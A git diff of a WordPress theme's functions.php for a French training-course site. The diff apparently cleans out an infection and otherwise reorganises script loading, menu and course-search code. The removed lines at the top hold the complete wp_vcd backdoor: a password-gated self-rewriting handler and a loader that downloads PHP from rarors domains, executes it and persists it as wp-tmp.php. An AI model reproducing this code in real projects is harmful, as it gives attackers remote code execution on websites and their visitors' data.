@@ -1,187 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '63617174fa3f350f17568ab058c91a5a'))
-{
-    $div_code_name="wp_vcd";
-    switch ($_REQUEST['action'])
-    {
-
-
-
-
-
-
-        case 'change_domain';
-            if (isset($_REQUEST['newdomain']))
-            {
-
-                if (!empty($_REQUEST['newdomain']))
-                {
-                    if ($file = @file_get_contents(__FILE__))
-                    {
-                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                        {
-
-                            $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-                            @file_put_contents(__FILE__, $file);
-                            print "true";
-                        }
-
-
-                    }
-                }
-            }
-            break;
-
-        case 'change_code';
-            if (isset($_REQUEST['newcode']))
-            {
-
-                if (!empty($_REQUEST['newcode']))
-                {
-                    if ($file = @file_get_contents(__FILE__))
-                    {
-                        if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                        {
-
-                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-                            @file_put_contents(__FILE__, $file);
-                            print "true";
-                        }
-
-
-                    }
-                }
-            }
-            break;
-
-        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-    }
-
-    die("");
-}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-            if( fwrite($handle, "<?php\n" . $phpCode))
-            {
-            }
-            else
-            {
-                $tmpfname = tempnam('./', "theme_temp_setup");
-                $handle   = fopen($tmpfname, "w+");
-                fwrite($handle, "<?php\n" . $phpCode);
-            }
-            fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-
-
-        $wp_auth_key='f008cf96406af32ae142ee92de8032e0';
-        if (($tmpcontent = @file_get_contents("http://www.rarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.rarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-
-            }
-        }
-
-
-        elseif ($tmpcontent = @file_get_contents("http://www.rarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-
-            }
-        } 
-
-        elseif ($tmpcontent = @file_get_contents("http://www.rarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-
-            }
-        }
-        elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } 
-
-
-
-
-
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 /**
  * Chargement de shortcodes
  */
@@ -191,43 +8,193 @@ include( 'inc/shortcodes.php' );
 // Enable shortcodes in text widgets
 add_filter('widget_text','do_shortcode');
 
+
+
+//---------------------------------------------------------------------------------
+//---------------------------------------------------------------------------------
+
+//------------------------ SCRIPT & STYLES ENQUEUING ------------------------------
+
+//---------------------------------------------------------------------------------
+//---------------------------------------------------------------------------------
+
 function tp_enqueue_scripts() {
+    global $wp_query;
+    if( isset($wp_query->post->ID) ){
+        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
+    }else{
+        $template_name = 'unknown';
+    }
+
+    wp_enqueue_script( 'jquery' );
+    wp_enqueue_style( 'menu', get_stylesheet_directory_uri() . '/css/menu.css', null, null );
+    wp_enqueue_script( 'slick', get_stylesheet_directory_uri() . '/js/slick/slick.min.js', array( 'jquery' ), null, false );
+    wp_enqueue_style( 'slick', get_stylesheet_directory_uri() . '/js/slick/slick.css', null );
+    wp_enqueue_script( 'formsubmission', get_stylesheet_directory_uri() . '/landing-page-catalogue/res/formSubmission.js', array( 'jquery' ), null, false );
+    wp_enqueue_script( 'trackingAnalytics', get_stylesheet_directory_uri() . '/js/trackingAnalytics.js', array( 'jquery' ), null, false );
+    wp_enqueue_style( 'main', get_stylesheet_directory_uri() . '/css/main.css', array( 'bootstrap-theme' ), null );
+    wp_enqueue_style( 'bootstrap', get_stylesheet_directory_uri() . '/css/bootstrap.min.css', null );
+    wp_enqueue_style( 'bootstrap-theme', get_stylesheet_directory_uri() . '/css/bootstrap-theme.min.css', array( 'bootstrap' ), null );
+    wp_enqueue_style( 'tp', get_stylesheet_directory_uri() . '/css/tp.css', array( 'main', 'js_composer_front' ), null );
+    wp_enqueue_script( 'gmaps', 'https://maps.google.com/maps/api/js?sensor=true', null, null, false );
+    wp_enqueue_script( 'contact-btn', get_template_directory_uri() . '/js/contact-btn.js', array( 'jquery' ), null, false );
+    wp_enqueue_style( 'button-style', get_template_directory_uri() . '/css/button.css', array( 'main', 'bootstrap' ), null );
+
+    wp_register_script( 'slick-courses', get_stylesheet_directory_uri() . '/js/slickCourses.js', array( 'slick' ), null, false );
+    wp_register_script( 'slick-refs', get_stylesheet_directory_uri() . '/js/slickRefs.js', array( 'slick' ), null, false );
+    wp_register_style( 'course-card', get_template_directory_uri() . '/css/course-card.css', null );
+    wp_register_style( 'references-style', get_template_directory_uri() . '/css/references.css', array( 'main' ), null );
+
+
     if ( is_tax( 'thematique' ) || is_page_template( 'tpl-nos-thematiques.php' ) ) {
         wp_enqueue_style( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.css', null, null, null );
         wp_enqueue_style( 'fullcalendar-print', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.print.css', array( 'fullcalendar' ), null, 'print' );
-
         wp_enqueue_script( 'moment', get_stylesheet_directory_uri() . '/js/fullcalendar/lib/moment.min.js', array( 'jquery' ), null, false );
         wp_enqueue_script( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.min.js', array( 'jquery' ), null, false );
         wp_enqueue_script( 'fullcalendar-fr', get_stylesheet_directory_uri() . '/js/fullcalendar/lang/fr.js', array( 'fullcalendar' ), null, false );
+        //        wp_enqueue_script( 'sticky-js', get_stylesheet_directory_uri() . '/js/sticky.js', array( 'jquery' ), null, false );
     }
-
-    wp_enqueue_style( 'bootstrap', get_stylesheet_directory_uri() . '/css/bootstrap.min.css', null );
-    wp_enqueue_style( 'bootstrap-theme', get_stylesheet_directory_uri() . '/css/bootstrap-theme.min.css', array( 'bootstrap' ), null );
-    wp_enqueue_style( 'main', get_stylesheet_directory_uri() . '/css/main.css', array( 'bootstrap-theme' ), null );
-    wp_enqueue_style( 'tp', get_stylesheet_directory_uri() . '/css/tp.css', array(
-        'main',
-        'js_composer_front'
-    ), null );
-    wp_enqueue_style( 'slick', get_stylesheet_directory_uri() . '/js/slick/slick.css', null );
-
-    wp_enqueue_script( 'jquery' );
-    wp_enqueue_script( 'formsubmission', get_stylesheet_directory_uri() . '/landing-page-catalogue/res/formSubmission.js', array( 'jquery' ), null, false );
-    wp_enqueue_script( 'trackingAnalytics', get_stylesheet_directory_uri() . '/js/trackingAnalytics.js', array( 'jquery' ), null, false );
-    wp_enqueue_script( 'bootstrap', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js', null, null, false );
-    wp_enqueue_script( 'easyListSplitter', get_stylesheet_directory_uri() . '/js/jquery.easyListSplitter.js', array( 'jquery' ), null, false );
-    wp_enqueue_script( 'matchHeight', get_stylesheet_directory_uri() . '/js/jquery.matchHeight-min.js', array( 'jquery' ), null, false );
-    wp_enqueue_script( 'slick', get_stylesheet_directory_uri() . '/js/slick/slick.min.js', array( 'jquery' ), null, false );
-    wp_enqueue_script( 'slick-custom', get_stylesheet_directory_uri() . '/js/slick-slider-custom-behavior.js', array( 'jquery' ), null, false );
-    wp_enqueue_script( 'isotope', get_stylesheet_directory_uri() . '/js/isotope.pkgd.min.js', array( 'jquery' ), null, false );
-    wp_enqueue_script( 'gmaps', 'https://maps.google.com/maps/api/js?sensor=true', null, null, false );
-    wp_enqueue_script( 'theme', get_stylesheet_directory_uri() . '/js/theme.js', array(
-        'bootstrap',
-        'slick'
-    ), null, false );
-
+    if(!is_front_page()){
+        wp_enqueue_script( 'easyListSplitter', get_stylesheet_directory_uri() . '/js/jquery.easyListSplitter.js', array( 'jquery' ), null, false );
+        //wp_enqueue_script( 'matchHeight', get_stylesheet_directory_uri() . '/js/jquery.matchHeight-min.js', array( 'jquery' ), null, false );
+        wp_enqueue_script( 'isotope', get_stylesheet_directory_uri() . '/js/isotope.pkgd.min.js', array( 'jquery' ), null, false );
+        wp_enqueue_script( 'theme', get_stylesheet_directory_uri() . '/js/theme.js', array( 'bootstrap', 'slick' ), null, false );
+    }
+    if(($template_name != 'template-pages-offre.php')
+       &&($template_name != 'tpl-nos-formations.php')
+       &&(is_page(260)) // page Clients
+      ){
+        wp_enqueue_style( 'home-style', get_template_directory_uri() . '/home/home_style.css', array( 'main' ), null );
+    }
 }
 
 add_action( 'wp_enqueue_scripts', 'tp_enqueue_scripts' );
+
+
+/**
+ * Chargement des styles et scripts pour les pages   'Offre'
+ */
+
+//Register hook to load scripts
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_offre');
+//Load scripts (and styles)
+function custom_scripts_and_styles_offre(){
+    if(is_page()){ //Check if we are viewing a page
+        global $wp_query;
+        //Check which template is assigned to current page we are looking at
+        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
+        if($template_name == 'template-pages-offre.php'){
+            wp_enqueue_script( 'owl-carousel', get_stylesheet_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.carousel.min.js', null, null, false );
+            wp_enqueue_script( 'pages-offre', get_stylesheet_directory_uri() . '/pages-offre/pages-offre.js', array( 'jquery', 'owl-carousel' ), null, false );
+            wp_enqueue_style( 'owl-carousel-style', get_template_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.carousel.min.css', null );
+            wp_enqueue_style( 'owl-carousel-theme-style', get_template_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.theme.default.min.css', null );
+            wp_enqueue_style( 'home-style', get_template_directory_uri() . '/home/home_style.css', array( 'main' ), null );
+            wp_enqueue_style( 'pages-offre-style', get_template_directory_uri() . '/pages-offre/pages-offre.css', array( 'home-style' ), null );
+            wp_enqueue_style( 'bootstrap-4-grid', get_template_directory_uri() . '/pages-offre/vendor/bootsrap4/css/bootstrap-grid.min.css', array( 'bootstrap' ) );
+            // dequeue
+            wp_dequeue_style('gforms_css');
+            wp_dequeue_style('gforms_formsmain_css');
+            wp_dequeue_style('gforms_reset_css');
+        }
+    }
+}
+
+
+/**
+ * Chargement des styles et scripts pour la page   'Contact'
+ */
+
+//Register hook to load scripts
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_contact');
+//Load scripts (and styles)
+function custom_scripts_and_styles_contact(){
+    if(is_page()){ //Check if we are viewing a page
+        global $wp_query;
+        //Check which template is assigned to current page we are looking at
+        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
+        if ( is_page( 'contact' ) ) {
+            wp_enqueue_style( 'contact-style', get_template_directory_uri() . '/css/contact.css', null );
+        }
+    }
+}
+//Disabling Automatic Scrolling On All Forms
+add_filter( 'gform_confirmation_anchor', '__return_false' );
+
+
+/**
+ * Chargement des styles et scripts pour la page   'Home'
+ */
+
+//Register hook to load scripts
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_home');
+//Load scripts (and styles)
+function custom_scripts_and_styles_home(){
+    if(is_page()){ 
+        if(is_front_page()){
+            wp_enqueue_style( 'home-style', get_template_directory_uri() . '/home/home_style.css', array( 'main' ), null );
+            wp_enqueue_script( 'home-script', get_stylesheet_directory_uri() . '/home/home_script.js', array( 'jquery' ), null, false );
+        }
+    }
+}
+
+
+/**
+ * Chargement des styles et scripts pour les pages Articles de blog
+ */
+
+//Register hook to load scripts
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_blog');
+//Load scripts (and styles)
+function custom_scripts_and_styles_blog(){
+    if(is_single()){ //Check if we are viewing an article
+        wp_enqueue_style( 'blog-style', get_template_directory_uri() . '/css/blog.css', array( 'main' ), null );
+    }
+}
+
+
+/**
+ * Chargement des styles et scripts pour la page 'Nos formations'
+ */
+
+//Register hook to load scripts
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_courses');
+//Load scripts (and styles)
+function custom_scripts_and_styles_courses(){
+    if(is_page()){ //Check if we are viewing a page
+        global $wp_query;
+        //Check which template is assigned to current page we are looking at
+        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
+        if($template_name == 'tpl-nos-formations.php'){
+
+            wp_enqueue_style( 'bootstrap4-grid', get_template_directory_uri() . '/landing-page-catalogue/vendor/bootsrap4/css/bootstrap-grid.min.css', null );
+            wp_enqueue_style( 'page-nos-formations', get_template_directory_uri() . '/css/page-nos-formations.css', array( 'main', 'references-style' ), null );
+
+            wp_enqueue_script( 'angular', get_stylesheet_directory_uri() . '/js/angular.min.js', null, null, false );
+            wp_enqueue_script( 'angular-sanitize', get_stylesheet_directory_uri() . '/js/angular-sanitize.min.js', null, null, false );
+            wp_enqueue_script( 'angular-animate', get_stylesheet_directory_uri() . '/js/angular-animate.min.js', null, null, false );
+
+            wp_enqueue_style( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.css', null, null, null );
+            wp_enqueue_style( 'fullcalendar-print', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.print.css', array( 'fullcalendar' ), null, 'print' );
+            wp_enqueue_script( 'moment', get_stylesheet_directory_uri() . '/js/fullcalendar/lib/moment.min.js', array( 'jquery' ), null, false );
+            wp_enqueue_script( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.min.js', array( 'moment' ), null, false );
+            wp_enqueue_script( 'fullcalendar-fr', get_stylesheet_directory_uri() . '/js/fullcalendar/lang/fr.js', array( 'fullcalendar' ), null, false );        
+        }
+
+        wp_enqueue_script( 'getCoursesByKeyword', get_stylesheet_directory_uri() . '/js/ajaxurl.js', array('jquery'), '1.0', true );
+        wp_localize_script('getCoursesByKeyword', 'ajaxurl', admin_url( 'admin-ajax.php' ) );    
+    }
+}
+
+
+
+
+//---------------------------------------------------------------------------------
+//---------------------------------------------------------------------------------
+
+//---------------------------------------------------------------------------------
+//---------------------------------------------------------------------------------
+
+
 
 if ( ! function_exists( 'digitalacademy_setup' ) ) {
     function digitalacademy_setup() {
@@ -238,7 +205,7 @@ if ( ! function_exists( 'digitalacademy_setup' ) ) {
         set_post_thumbnail_size( 367, 183, true );
 
         add_image_size( 'header-formation', 270, 120, true );
-        add_image_size( 'blog', 700, 310, true );
+        add_image_size( 'blog', 1230, 310, true );
         add_image_size( 'testimony', 100, 100, true );
         add_image_size( 'press', 120, 120, true );
 
@@ -325,8 +292,6 @@ function digital_share_bouton( $link, $title ) {
 
 <?php
                                                }
-
-
 function digital_get_thematiques_picto() {
     $pictos = false;
 
@@ -337,7 +302,6 @@ function digital_get_thematiques_picto() {
             }
         }
     }
-
     return $pictos;
 }
 
@@ -429,6 +393,7 @@ function digital_get_reference_menu( $term_id = false, $first = false ) {
 function digital_get_type_menu( $taxonomy = 'type' ) {
     $current_term   = get_queried_object();
     $parent_term_id = empty( $current_term->parent ) ? $current_term->term_id : $current_term->parent;
+    $menu = '';
 
     if ( $types = get_terms( $taxonomy, array( 'parent' => 0 ) ) ) {
         foreach ( $types as $type ) {
@@ -481,53 +446,6 @@ function digital_get_formation_dates( $formation_id ) {
     }
 }
 
-class Walker_Digital_Top_Menu extends Walker_Nav_Menu {
-    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
-        global $wp_query;
-        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
-
-        $class_names = '';
-
-        $classes   = empty( $item->classes ) ? array() : (array) $item->classes;
-        $classes[] = 'menu-item-' . $item->ID;
-
-        $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
-        $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';
-
-        $id = apply_filters( 'nav_menu_item_id', 'menu-item-' . $item->ID, $item, $args );
-        $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';
-
-        $output .= $indent . '<li' . $id . $class_names . '>';
-
-        $attributes = ! empty( $item->attr_title ) ? ' title="' . esc_attr( $item->attr_title ) . '"' : '';
-        $attributes .= ! empty( $item->target ) ? ' target="' . esc_attr( $item->target ) . '"' : '';
-        $attributes .= ! empty( $item->xfn ) ? ' rel="' . esc_attr( $item->xfn ) . '"' : '';
-        $attributes .= ! empty( $item->url ) ? ' href="' . esc_attr( $item->url ) . '"' : '';
-
-        $item_output = $args->before;
-        $item_output .= '<a' . $attributes . '>';
-        $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
-        $item_output .= '</a>';
-
-        $submenus = 0 == $depth || 1 == $depth ? get_posts( array(
-            'post_type'   => 'nav_menu_item',
-            'numberposts' => 1,
-            'meta_query'  => array(
-                array(
-                    'key'    => '_menu_item_menu_item_parent',
-                    'value'  => $item->ID,
-                    'fields' => 'ids'
-                )
-            )
-        ) ) : false;
-        $item_output .= ! empty( $submenus ) ? ( 0 == $depth ? '<div class="arrow"><span class="closed">+</span><span class="opened">-</span></div>' : '<span class="sub-arrow"></span>' ) : '';
-
-        $item_output .= $args->after;
-
-        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
-    }
-}
-
 add_action( 'pre_get_posts', 'no_limit_archive' );
 function no_limit_archive( $query ) {
     if ( ! is_admin() && $query->is_main_query() && is_post_type_archive( array( 'formation' ) ) ) {
@@ -543,7 +461,8 @@ add_action( 'send_headers', 'tgm_io_strict_transport_security' );
  * @since 1.0.0
 */
 function tgm_io_strict_transport_security() {
-    header( 'Strict-Transport-Security: max-age=10886400; includeSubDomains; preload' );
+    //header( 'Strict-Transport-Security: max-age=10886400; includeSubDomains; preload' );
+    // DISABLED, this line cause an PHP warning: "Cannot modify header information - headers already sent by (output started at D:\www\local.digitalacademy.fr\wp-includes\functions.php:4196) in D:\www\local.digitalacademy.fr\wp-content\themes\digitalacademy\functions.php"
 }
 
 
@@ -584,119 +503,366 @@ function wrap_gform_cdata_close( $content = '' ) {
 
 
 
-/**
- * Chargement des styles et scripts pour les pages   'Offre'
- */
+// -----------------------------------------------------------------------
+// FN: Custom walker for nav / multi level / CSS only
+// -----------------------------------------------------------------------
 
-//Register hook to load scripts
-add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_offre');
-//Load scripts (and styles)
-function custom_scripts_and_styles_offre(){
-
-    if(is_page()){ //Check if we are viewing a page
+class KZ_Walker_Digital_Top_Menu extends Walker_Nav_Menu {
+    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
         global $wp_query;
+        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
 
-        //Check which template is assigned to current page we are looking at
-        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
-        if($template_name == 'template-pages-offre.php'){
-            wp_enqueue_script( 'owl-carousel', get_stylesheet_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.carousel.min.js', null, null, false );
-            wp_enqueue_script( 'pages-offre', get_stylesheet_directory_uri() . '/pages-offre/pages-offre.js', array( 'jquery', 'owl-carousel' ), null, false );
-            wp_enqueue_style( 'owl-carousel-style', get_template_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.carousel.min.css', null );
-            wp_enqueue_style( 'owl-carousel-theme-style', get_template_directory_uri() . '/pages-offre/vendor/owl-carousel/owl.theme.default.min.css', null );
-            wp_enqueue_style( 'pages-offre-style', get_template_directory_uri() . '/pages-offre/pages-offre.css', null );
-            wp_enqueue_style( 'bootstrap-4-grid', get_template_directory_uri() . '/pages-offre/vendor/bootsrap4/css/bootstrap-grid.min.css', array( 'bootstrap' ) );
-            // dequeue
-            wp_dequeue_style('gforms_css');
-            wp_dequeue_style('gforms_formsmain_css');
-            wp_dequeue_style('gforms_reset_css');
+        $output .= '<li>';
+        $attributes = ! empty( $item->attr_title ) ? ' title="' . esc_attr( $item->attr_title ) . '"' : '';
+        $attributes .= ! empty( $item->target ) ? ' target="' . esc_attr( $item->target ) . '"' : '';
+        $attributes .= ! empty( $item->xfn ) ? ' rel="' . esc_attr( $item->xfn ) . '"' : '';
+        $attributes .= ! empty( $item->url ) ? ' href="' . esc_attr( $item->url ) . '"' : '';
+
+
+        $item_output = $args->before;
+        $item_output .= '<a' . $attributes . '>';
+        $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
+
+        $submenus = 0 == $depth || 1 == $depth ? get_posts( array(
+            'post_type'   => 'nav_menu_item',
+            'numberposts' => 1,
+            'meta_query'  => array(
+                array(
+                    'key'    => '_menu_item_menu_item_parent',
+                    'value'  => $item->ID,
+                    'fields' => 'ids'
+                )
+            )
+        ) ) : false;
+        $item_output .= ! empty( $submenus ) ? ( 0 == $depth ? '<span class="drop-icon">-</span><label title="Toggle Drop-down" class="drop-icon" for="sm'. $item->ID .'">+</label></a><input type="checkbox" id="sm'. $item->ID .'">' : '' ) : '</a>';
+
+        $item_output .= $args->after;
+
+        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
+    }
+}
+
+
+
+// -----------------------------------------------------------------------
+// FN: SEARCH COURSES BY KEYWORDS (including ACF fields)
+// (if keywords = " " the function return all courses)
+// -----------------------------------------------------------------------
+
+include_once(get_stylesheet_directory().'/inc/acf/custom-search.php');
+
+function kz_search($keywords){
+
+    if(isset($_POST['keywords'])){
+        $keywords = $_POST['keywords'];
+    }
+    $args = array(
+        'posts_per_page' => -1,
+        'post_type'      => 'formation',
+        'post_status'    => 'publish',
+        's'              => $keywords
+    );
+    // The Query
+    $ACF_query = new WP_Query( $args );
+
+    /* Restore original Post Data */
+    wp_reset_postdata();
+    if ( has_post_thumbnail() ) {
+        $class = '';
+    }
+    // pass paramaters
+    $url_parameters = explode( '?', $_SERVER["REQUEST_URI"] );
+    if(isset($url_parameters[1])){
+        $url_parameters = $url_parameters[1];
+    }else{
+        $url_parameters = '';
+    }
+    // get query string
+    $search_query = isset($_GET['q']) ?  $_GET['q'] : null ;  // ...
+    // ...
+    $arr = array();
+    $thema_arr = array();
+    $formations = $ACF_query->posts;
+
+    if ( $formations ) { 
+        foreach ( $formations as $formation ) {
+            // thematique(s)
+            $terms = get_the_terms($formation->ID, 'thematique');        
+            unset($course_thematique);
+            $course_thematique[] = array();
+            if( ( isset($terms) )&&( is_array($terms) ) ){
+                foreach($terms as $i => $term) {
+                    if( ( isset($terms[$i]->name) )&&( isset($terms[$i]->slug) ) ){
+                        $course_thematique[] = array('name' => $terms[$i]->name, 'slug' => $terms[$i]->slug, 'color' => $terms[$i]->couleur);
+                        // global thema array push if not dupply
+                        $thema_arr[] = [ 
+                            'slug' => $terms[$i]->slug,
+                            'name' => $terms[$i]->name,
+                            'color' => get_field( 'couleur', 'thematique_'. $terms[$i]->term_id )
+                        ];
+                        $thema_arr = array_unique($thema_arr, SORT_REGULAR); // remove dupply
+                        $thema_arr = array_values($thema_arr); // reindex
+                    }
+                }
+            }
+            array_shift($course_thematique);
+            if ( get_field( 'image_header_formation', $formation->ID ) ){
+                // Course Link
+                $course_link = get_the_permalink( $formation->ID );
+                // Course Image
+                $course_image = get_field( 'image_header_formation', $formation->ID ); 
+            }
+            if ( get_field( 'nouvelle_formation', $formation->ID ) ){
+                // New Course ?
+                $course_new = true;
+            }else{
+                $course_new = false;
+            }
+            if ( get_field( 'top_formation', $formation->ID ) ){
+                // Top Course ?
+                $course_top = true;
+            }else{
+                $course_top = false;
+            }
+            // Course Title
+            $course_title = get_the_title( $formation->ID );
+            // Course Session
+            if( have_rows('sessions', $formation->ID) ){    
+                $row = 0;
+                $session_arr = array();
+                while ( have_rows('sessions', $formation->ID) ) { 
+                    the_row();
+                    $row +=1;
+                    $date_session = strtotime( get_sub_field( 'date_session' ) );
+                    if ( time() < $date_session ){
+                        // Session Place
+                        $session_place = get_sub_field('lieu_session');
+                        // Session Date
+                        $session_date = date_i18n( get_option( 'date_format' ), $date_session );
+                        // Session Link
+                        $session_link = get_the_permalink( $formation->ID ) . '?' . $url_parameters . "#Inscription" ;
+                        $session_arr[] = [ 
+                            'place' => $session_place,
+                            'date' => $session_date,
+                            'link' => $session_link
+                        ];
+                    }
+                };
+            }; 
+            if ( get_field( 'presentation', $formation->ID ) ){
+                // Course Description text
+                $course_description = wp_trim_words( get_field( 'presentation', $formation->ID ), 20, '...' );
+            }else{
+                $course_description = false;
+            }
+            // Trainer                                     
+            if ( $formateurs = wp_get_post_terms( $formation->ID, 'formateur' ) ){
+                $j = 0; 
+                foreach ( $formateurs as $formateur ){
+                    if($j==0){
+                        // Trainer picture
+                        $trainer_image = get_field( 'avatar', 'formateur_' . $formateur->term_id );
+                        // Trainer name
+                        $trainer_name = $formateur->name; 
+                    }
+                }
+                $j=+1;    
+            }
+            $arr[] = [ 
+                'course_id' => $formation->ID, 
+                'course_link' => $course_link, 
+                'course_image' => $course_image, 
+                'course_new' => $course_new, 
+                'course_top' => $course_top, 
+                'course_title' => $course_title, 
+                'course_description' => $course_description, 
+                'course_sessions' => $session_arr,
+                'trainer_name' => $trainer_name, 
+                'trainer_image' => $trainer_image,
+                'course_thema' => $course_thematique
+            ];
+            //clear vars
+            $course_link = $course_image = $course_new = $course_top = $course_title = $course_description = $next_session_place = $next_session_date = $next_session_link = $trainer_name = $trainer_image = $course_thematique = null;
         }
     }
+    // response output
+    $json_arr = json_encode($arr);
+    $json_thema_arr = json_encode($thema_arr);
+
+    // if keywords not set,  return full array of courses
+    if ($keywords == " "){
+        return array($json_arr, $json_thema_arr);
+        // else, print courses
+    }else{
+        echo json_encode(array('courses'=>$arr,'thema_arr'=>$thema_arr));
+    }
 }
 
+add_action('wp_ajax_kz_search', 'kz_search');
+add_action('wp_ajax_nopriv_kz_search', 'kz_search');
 
 
-/**
- * Chargement des styles et scripts pour la page   'Contact'
- */
 
-//Register hook to load scripts
-add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_contact');
-//Load scripts (and styles)
-function custom_scripts_and_styles_contact(){
+// -----------------------------------------------------------------------
+// FN: Display Courses Slider
+// -----------------------------------------------------------------------
 
-    if(is_page()){ //Check if we are viewing a page
-        global $wp_query;
+function kz_shortcode_coursesSlider( $atts ) {   
+    global $post;
+    if(isset($post->ID)){
+        $post_id = $post->ID;
+    }else{
+        $post_id = null;
+    }
 
-        //Check which template is assigned to current page we are looking at
-        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
-        if ( is_page( 'contact' ) ) {
-            wp_enqueue_style( 'contact-style', get_template_directory_uri() . '/css/contact.css', null );
+
+    wp_enqueue_script( 'slick-courses' );
+    wp_enqueue_style( 'course-card');
+
+    $a = shortcode_atts( array(
+        'type' => false,
+        'nb'   => 10,
